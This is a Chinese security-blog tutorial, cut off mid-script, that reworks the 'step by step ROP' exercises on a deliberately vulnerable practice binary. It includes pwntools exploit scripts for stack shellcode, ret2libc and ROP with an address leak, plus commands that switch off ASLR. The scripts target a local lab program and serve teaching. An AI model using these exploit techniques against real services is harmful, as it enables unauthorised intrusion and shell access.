</ul>
</li>
<li>NodeJS</li>
<li>AngularJS</li>
</ul>
</li>
<li><strong>GO</strong><ul>
<li>GO安全<ul>
<li><a href="/2020/01/01/浅析Influxdb认证绕过漏洞/">浅析Influxdb认证绕过漏洞</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>二进制安全</strong><ul>
<li>二进制基础<ul>
<li><a href="/2019/05/24/GOT表-PLT表与动态链接/">ELF动态链接,PLT和GOT</a></li>
<li><a href="/2019/04/27/堆基础/">堆基础</a></li>
<li><a href="/2019/04/15/ELF二进制格式/">ELF二进制格式</a></li>
<li><a href="/2019/03/03/栈及栈帧/">栈基础</a></li>
<li><a href="/2019/02/09/ELF安全防御机制小结/">ELF安全防御机制小结</a></li>
<li><a href="/2019/01/28/IA-32寄存器/">IA-32（Intel Architecture 32位）寄存器</a></li>
<li><a href="/2019/01/01/Linux环境与相关工具/">Linux环境与相关工具</a></li>
</ul>
</li>
<li>C/C++<ul>
<li><a href="/2019/03/24/C编写实现Linux反弹shell/">C编写实现Linux反弹shell</a></li>
</ul>
</li>
<li>逆向工程</li>
<li>Fuzzing</li>
<li>Pwn<ul>
<li><a href="/2019/04/20/花式栈溢出之stack-pivoting/">花式栈溢出之stack pivoting</a></li>
<li><a href="/2019/04/12/中级ROP之ret2csu/">栈溢出之ret2csu</a></li>
<li><a href="/2019/04/09/蒸米ROP学习笔记/">蒸米32位及64位ROP笔记</a></li>
<li><a href="/2019/04/07/pwntools笔记/">pwntools笔记</a></li>
<li><a href="/2019/03/23/花式栈溢出之Stack-smash/">花式栈溢出之Stack smash</a></li>
<li><a href="/2019/03/05/栈溢出之ret2libc/">栈溢出之ret2libc</a></li>
<li><a href="/2019/03/03/栈溢出之ret2syscall/">栈溢出之ret2syscall</a></li>
<li><a href="/2019/03/03/栈溢出之ret2shellcode/">栈溢出之ret2shellcode</a></li>
<li><a href="/2019/03/03/ROP之ret2text/">ROP基础及栈溢出之ret2text</a></li>
<li><a href="/2019/03/03/栈溢出基本原理/">栈溢出基本原理</a></li>
</ul>
</li>
<li>WriteUp Pwn<ul>
<li><a href="/2019/03/08/TAMUctf-Pwn-writeup/">TAMUctf Pwn writeup</a></li>
</ul>
</li>
<li>WriteUp Reverse<ul>
<li><a href="/2019/01/01/HITB_Binary_100_writeup/">HITB Binary 100 writeup</a></li>
</ul>
</li>
</ul>
</li>
<li><strong>渗透测试</strong><ul>
<li>基础&amp;Tricks</li>
<li>Kali</li>
<li>Metasploit</li>
<li>内网渗透</li>
<li>提权<ul>
<li><a href="/2019/01/01/关于本地提权的学习笔记（一）：Administrator提权到System">Administrator提权到System</a></li>
<li><a href="/2019/01/01/关于本地提权的学习笔记（二）：注入进程和利用漏洞提权">注入进程和利用漏洞提权</a></li>
</ul>
</li>
<li>免杀</li>
<li>工具</li>
</ul>
</li>
<li><strong>OS</strong><ul>
<li>Windows<ul>
<li><a href="/2019/01/01/将Python脚本转换为exe">将Python脚本转换为exe</a></li>
<li><a href="/2019/01/01/几个查看用户信息的Windows程序">几个查看用户信息的Windows程序</a></li>
</ul>
</li>
<li>Linux</li>
</ul>
</li>
</ul>

  </div>
</div>
</div>

<header class="post-header text-center">
	<h1 class="title">
		蒸米32位及64位ROP笔记
	</h1>
	<span class="read">
		阅读量 <span id="busuanzi_value_page_pv"></span>
	</span>
</header><br>

<div class="book-post">
  <p>这里将《一步一步学 ROP 之 Linux_x86 篇》和《一步一步学 ROP 之 Linux_64 篇》中的例子做一遍并记录下来。</p>
<h2 id="0x01-32位ROP"><a href="#0x01-32位ROP" class="headerlink" title="0x01 32位ROP"></a>0x01 32位ROP</h2><h3 id="level1——栈上执行shellcode"><a href="#level1——栈上执行shellcode" class="headerlink" title="level1——栈上执行shellcode"></a>level1——栈上执行shellcode</h3><p>level1主要演示32位程序中最基本的栈溢出利用，可直接在栈上写shellcode并执行。</p>
<p>level1.c：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vulnerable_function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">	read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">	vulnerable_function();</span><br><span class="line">	write(STDOUT_FILENO, <span class="string">"Hello, World\n"</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用如下指令编译：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -z execstack -o level1 level1.c</span><br></pre></td></tr></table></figure>
<p>-m32参数指定编译为32位程序；-fno-stack-protector参数指定不开启堆栈溢出保护，即不生成 canary；-z execstack参数指定允许栈执行，即不开启NX。</p>
<p>下面3条指令用来关闭整个linux系统的ASLR保护：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p>运行程序，输入一串字符串然后返回helloworld；file查看是个动态链接的32位文件；checksec查看所有安全编译选项都没有开：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/1.png" alt=""></p>
<p>利用pattern计算偏移，可得到溢出偏移量为140：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/2.png" alt=""></p>
<p>由此，我们可以构造”A”*140+shellcode_addr即可将shellcode地址覆盖到函数返回地址中，从而让EIP指针寄存器指向shellcode地址让程序执行shellcode。</p>
<p>这里NX没开，我们可以直接往栈上写shellcode，具体为shellcode+”A”*(140-len(shellcode))+shellcode_addr。</p>
<p>shellcode的构造直接用pwntools的asm(shellcraft.sh())来获得。</p>
<p>下面获取写入的shellcode地址。由于ASLR等都关掉，因此现在获取的地址就不会变了。</p>
<p><strong>一个GDB的坑</strong></p>
<p>在GDB中调试level1，r运行，再输入”abcdaaaaa……”让程序崩溃，然后输入x/10s \$esp-144（144是由前面得到的140偏移再加上4字节的ret得到的）：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/3.png" alt=""></p>
<p>得到shellcode输入位置的偏移为0xffffcf70。</p>
<p>写payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level1"</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode_addr = <span class="number">0xffffcf70</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">140</span>, <span class="string">"A"</span>) + p32(shellcode_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>然而在运行时会报错，无法正常利用。</p>
<p><strong>填坑</strong></p>
<blockquote>
<p>对初学者来说这个shellcode地址的位置其实是一个坑。因为正常的思维是使用gdb调试目标程序，然后查看内存来确定shellcode的位置。但当你真的执行exp的时候你会发现shellcode压根就不在这个地址上！这是为什么呢？原因是gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./level1的时候，buf的位置会固定在别的地址上。怎么解决这个问题呢？</p>
</blockquote>
<p>最简单的方法就是开启core dump这个功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br><span class="line">sudo sh -c &apos;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&apos;</span><br></pre></td></tr></table></figure>
<p>开启之后，当出现内存错误的时候，系统会生成一个core dump文件在tmp目录下。然后我们再用gdb查看这个core文件就可以获取到buf真正的地址了。</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/4.png" alt=""></p>
<p>由此得到shellcode真正的地址0xffffcfb0。</p>
<p>改下payload的地址即可getshell：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level1"</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode_addr = <span class="number">0xffffcfb0</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">140</span>, <span class="string">"A"</span>) + p32(shellcode_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/5.png" alt=""></p>
<p>除了本地调试，还有远程部署的方式，如下，将题目绑定到指定端口上：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp<span class="_">-l</span>:10001,fork <span class="built_in">exec</span>:./level1</span><br></pre></td></tr></table></figure>
<p>payload除了将p = process(“./level1”)改为p = remote(“127.0.0.1”, 10001)外，ret的地址还会发生改变。解决方法还是采用生成core dump的方案，然后用gdb调试core文件获取返回地址：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/6.png" alt=""></p>
<p>得到ret地址为0xffffcf00，改下payload即可远程getshell：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/7.png" alt=""></p>
<h3 id="level2——ret2libc绕过NX"><a href="#level2——ret2libc绕过NX" class="headerlink" title="level2——ret2libc绕过NX"></a>level2——ret2libc绕过NX</h3><p>一样的代码，只不过在用GCC编译开启NX保护即栈不可执行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fno-stack-protector -o level2 level1.c</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/8.png" alt=""></p>
<blockquote>
<p>这时候我们如果使用level1的exp来进行测试的话，系统会拒绝执行我们的shellcode。如果你通过<code>sudo cat /proc/[pid]/maps</code>查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。</p>
</blockquote>
<p><img src="/2019/04/09/蒸米ROP学习笔记/9.png" alt=""></p>
<p>既然开启了NX，那一般是利用ROP绕过，这里用的是ret2libc，因为程序level2调用了libc.so，并且libc.so里保存了大量可利用的函数如system()和/bin/sh，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。</p>
<p>下面的问题就变为怎么获取libc中的system和binsh的地址。</p>
<p>因为我们关掉了ASLR，此时system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。</p>
<p>此时我们可以使用GDB进行调试，在main打下断点然后运行，程序在main断点处停下再通过print和find命令来查找system和”/bin/sh”字符串的地址：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/10.png" alt=""></p>
<p>system()函数地址为：0xf7e42940</p>
<p>/bin/sh地址为：0xf7f6102b</p>
<p>至于溢出偏移量和level1一样为140。</p>
<p>编写payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./level2"</span>)</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0xf7e42940</span></span><br><span class="line">binsh_addr = <span class="number">0xf7f6102b</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/11.png" alt=""></p>
<h3 id="level2——ROP绕过NX和ASLR"><a href="#level2——ROP绕过NX和ASLR" class="headerlink" title="level2——ROP绕过NX和ASLR"></a>level2——ROP绕过NX和ASLR</h3><p>在前一小节的基础下，开启在level1中关掉的ASLR：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo -s</span><br><span class="line"><span class="built_in">echo</span> 2 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p>如果你通过sudo cat /proc/[pid]/maps或者ldd查看，你会发现level2的libc.so地址每次都是变化的：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/12.png" alt=""></p>
<p>此时利用前一小节的办法print和find是获取不到对的地址的，因为每次运行栈的地址都会变化。</p>
<p>如何利用呢？——思路是：先泄漏出libc.so某些函数在内存中的地址，再利用泄漏出的函数地址根据偏移量计算出system()函数和/bin/sh字符串在内存中的地址，最后执行我们的ret2libc的shellcode。既然栈、libc、堆的地址都是随机的，我们怎么才能泄露出libc.so的地址呢？方法还是有的，因为程序本身在内存中的地址并不是随机的，如图所示，Linux内存随机化分布图：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/13.png" alt=""></p>
<p>所以我们只要把返回值设置到程序本身就可执行我们期望的指令了。</p>
<p>首先我们利用objdump来查看可以利用的plt函数和函数对应的got表：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/14.png" alt=""></p>
<blockquote>
<p>除了程序本身的函数之外，还有read@plt()和write@plt()函数可用，但因为程序本身没有调用system()函数因此并不能直接调用system()来获取shell。但其实我们有write@plt()函数就够了，因为我们可以通过write@plt ()函数把write()函数在内存中的地址也就是write.got给打印出来。</p>
<p>既然write()函数实现是在libc.so当中，那我们调用的write@plt()函数为什么也能实现write()功能呢? 这是因为linux采用了延时绑定技术，当我们调用write@plit()的时候，系统会将真正的write()函数地址link到got表的write.got中，然后write@plit()会根据write.got跳转到真正的write()函数上去。（如果还是搞不清楚的话，推荐阅读《程序员的自我修养 - 链接、装载与库》这本书）</p>
<p>因为system()函数和write()在libc.so中的offset(相对地址)是不变的，所以如果我们得到了write()的地址并且拥有目标服务器上的libc.so就可以计算出system()在内存中的地址了。</p>
<p>然后我们再将pc指针return回vulnerable_function()函数，就可以进行ret2libc溢出攻击，并且这一次我们知道了system()在内存中的地址，就可以调用system()函数来获取我们的shell了。</p>
<p>使用ldd命令可以查看目标程序调用的so库。随后我们把libc.so拷贝到当前目录，因为我们的exp需要这个so文件来计算相对地址：</p>
</blockquote>
<p><img src="/2019/04/09/蒸米ROP学习笔记/15.png" alt=""></p>
<p>当然，除了用ldd命令查看libc.so库，还可以直接用pwntools库的elf.libc来获取libc.so库：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">libc = elf.libc</span><br></pre></td></tr></table></figure>
<p>编写payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./level2")</span></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">vulnerable_function_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() plt: "</span> + hex(write_plt)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]vulnerable_function() addr: "</span> + hex(vulnerable_function_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">140</span> + p32(write_plt) + p32(vulnerable_function_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload1 to leak write libc addr..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write libc addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line">libc.address = write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]binsh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeedbeef</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload2 to getshell..."</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2019/04/09/蒸米ROP学习笔记/16.png" alt=""></p>
<p>另一种是ldd命令查找再赋值libc.so文件到当前目录再加载的payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./level2")</span></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"libc.so.6"</span>)</span><br><span class="line"><span class="comment">#libc = elf.libc</span></span><br><span class="line">write_plt = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line">vulnerable_function_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() plt: "</span> + hex(write_plt)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]vulnerable_function() addr: "</span> + hex(vulnerable_function_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">"A"</span> * <span class="number">140</span> + p32(write_plt) + p32(vulnerable_function_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload1 to leak write libc addr..."</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write libc addr: "</span> + hex(write_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc.address = write_addr - libc.symbols["write"]</span></span><br><span class="line">system_addr = libc.symbols[<span class="string">"system"</span>] + write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">binsh_addr = next(libc.search(<span class="string">"/bin/sh"</span>)) + write_addr - libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]binsh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">140</span> + p32(system_addr) + p32(<span class="number">0xdeedbeef</span>) + p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload2 to getshell..."</span></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="level2——Memory-Leak-amp-DynELF"><a href="#level2——Memory-Leak-amp-DynELF" class="headerlink" title="level2——Memory Leak &amp; DynELF"></a>level2——Memory Leak &amp; DynELF</h3><p>本小节介绍了在不获取目标libc.so的情况下进行ROP攻击。</p>
<p>前面一小节我们用到了目标机器的libc.so才能计算出libc中system()和/bin/sh等的地址来实现攻击，但是如果我们在获取不到目标机器上的libc.so情况下，应该如何做呢？这时候就需要通过memory leak(内存泄露)来搜索内存找到system()的地址。</p>
<blockquote>
<p>这里我们采用pwntools提供的DynELF模块来进行内存搜索。首先我们需要实现一个leak(address)函数，通过这个函数可以获取到某个地址上最少1 byte的数据。拿我们上一篇中的level2程序举例。leak函数应该是这样实现的：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">    payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload1)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"%#x =&gt; %s"</span> % (address, (data <span class="keyword">or</span> <span class="string">''</span>).encode(<span class="string">'hex'</span>))</span><br><span class="line">	<span class="keyword">return</span> data</span><br></pre></td></tr></table></figure>
<blockquote>
<p>随后将这个函数作为参数再调用d = DynELF(leak, elf=ELF(‘./level2’))就可以对DynELF模块进行初始化了。然后可以通过调用system_addr = d.lookup(‘system’, ‘libc’)来得到libc.so中system()在内存中的地址。</p>
<p>要注意的是，通过DynELF模块只能获取到system()在内存中的地址，但无法获取字符串“/bin/sh”在内存中的地址。所以我们在payload中需要调用read()将“/bin/sh”这字符串写入到程序的.bss段中。.bss段是用来保存全局变量的值的，地址固定，并且可以读可写。通过readelf -S level2这个命令就可以获取到bss段的地址了。</p>
</blockquote>
<p><img src="/2019/04/09/蒸米ROP学习笔记/17.png" alt=""></p>
<p>当然，可以在pwntools中直接调用elf.bss()获取.bss段地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">bss_base = elf.bss()</span><br></pre></td></tr></table></figure>
<p>因为我们在执行完read()之后要接着调用system(“/bin/sh”)，并且read()这个函数的参数有三个，所以我们需要一个pop pop pop ret的gadget用来保证栈平衡。这里我们用ROPgadget来寻找：</p>
<p><img src="/2019/04/09/蒸米ROP学习笔记/18.png" alt=""></p>
<p>编写payload：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"127.0.0.1"</span>, <span class="number">10001</span>)</span><br><span class="line"><span class="comment">#p = process("./level2")</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./level2"</span>)</span><br><span class="line">bss_base = elf.bss()</span><br><span class="line">plt_write = elf.plt[<span class="string">"write"</span>]</span><br><span class="line">plt_read = elf.plt[<span class="string">"read"</span>]</span><br><span class="line">vulfun_addr = elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() plt: "</span> + hex(plt_write)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]read() plt: "</span> + hex(plt_read)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]vulnerable_function() addr: "</span> + hex(vulfun_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*].bss addr: "</span> + hex(bss_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(address)</span>:</span></span><br><span class="line">        payload1 = <span class="string">'a'</span>*<span class="number">140</span> + p32(plt_write) + p32(vulfun_addr) + p32(<span class="number">1</span>) +p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">        p.send(payload1)</span><br><span class="line">        data = p.recv(<span class="number">4</span>)</span><br><span class="line">        <span class="comment">#print "%#x =&gt; %s" % (address, (data or '').encode('hex'))</span></span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">'./level2'</span>))</span><br><span class="line"></span><br><span class="line">execve_addr = d.lookup(<span class="string">'execve'</span>, <span class="string">'libc'</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]execve() addr: "</span> + hex(execve_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#system_addr = d.lookup('system', 'libc')</span></span><br><span class="line"><span class="comment">#print "[*]system() addr: " + hex(system_addr)</span></span><br><span class="line"></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x080484f9</span></span><br><span class="line">payload2 = <span class="string">"A"</span> * <span class="number">140</span> + p32(plt_read) + p32(pop_pop_pop_ret) + p32(<span class="number">0</span>) + p32(bss_base) + p32(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_base)</span></span><br><span class="line">payload2 += 